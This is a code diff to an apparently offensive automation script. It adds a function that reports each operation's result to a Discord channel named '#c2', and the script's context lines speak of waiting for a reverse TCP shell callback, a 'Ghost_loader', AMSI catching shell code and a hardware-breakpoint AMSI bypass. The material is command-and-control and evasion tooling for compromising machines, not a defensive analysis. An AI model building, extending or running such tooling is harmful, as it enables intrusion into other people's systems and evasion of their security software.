@@ -389,7 +389,7 @@ def run(skip_build=False, discord_only=False):
 
     if discord_only:
         ok("--discord-only: skipping TCP wait")
-        _print_summary()
+        _print_summary(token, channel_id)
         return
 
     # ── STEP 6: wait for TCP callback ───────────────────────────────────────
@@ -414,7 +414,7 @@ def run(skip_build=False, discord_only=False):
         info("  → AMSI caught [scriptblock]::Create(shell_code) — need dark_room HWBP")
         info("  → Network issue (check file server 200 response in logs)")
         info("  → Ghost_loader already running from last attempt — duplicate send")
-        _print_summary()
+        _print_summary(token, channel_id)
         return
 
     conn, addr = result
@@ -474,10 +474,27 @@ def run(skip_build=False, discord_only=False):
     conn.close()
 
     # ── SUMMARY ─────────────────────────────────────────────────────────────
-    _print_summary()
+    _print_summary(token, channel_id)
 
 
-def _print_summary():
+def _post_palpatine(token, channel_id, msg):
+    """Post auto_op result to Discord #c2 so PALPATINE can respond."""
+    try:
+        data = json.dumps({"content": msg}).encode()
+        req = urllib.request.Request(
+            f"https://discord.com/api/v10/channels/{channel_id}/messages",
+            data=data,
+            headers={"Authorization": f"Bot {token}",
+                     "Content-Type": "application/json",
+                     "User-Agent": "DiscordBot (cheyanne, 1.0)"},
+            method="POST"
+        )
+        urllib.request.urlopen(req, timeout=10)
+    except Exception:
+        pass
+
+
+def _print_summary(token=None, channel_id=None):
     total = len(_steps_passed) + len(_steps_failed)
     print(f"\n  {BOLD}{'═'*60}{RST}")
     print(f"  {BOLD}RESULTS: {len(_steps_passed)}/{total} passed{RST}")
@@ -488,6 +505,18 @@ def _print_summary():
         for s in _steps_failed:
             print(f"  {RED}  ✗ {s}{RST}")
     print(f"  {BOLD}{'═'*60}{RST}\n")
+
+    if token and channel_id:
+        passed = len(_steps_passed)
+        failed_list = ", ".join(_steps_failed) if _steps_failed else "none"
+        status = "SUCCESS" if not _steps_failed else "PARTIAL" if passed else "FAILED"
+        msg = (
+            f"**[AUTO_OP] {status}** — {passed}/{total} steps passed\n"
+            f"Failed: {failed_list}\n"
+            + ("TCP shell connected. `interact <sid>` to use it." if "TCP session established" in _steps_passed
+               else "TCP shell not connected. Type `diagnose` for next steps.")
+        )
+        _post_palpatine(token, channel_id, msg)
 
 
 if __name__ == "__main__":
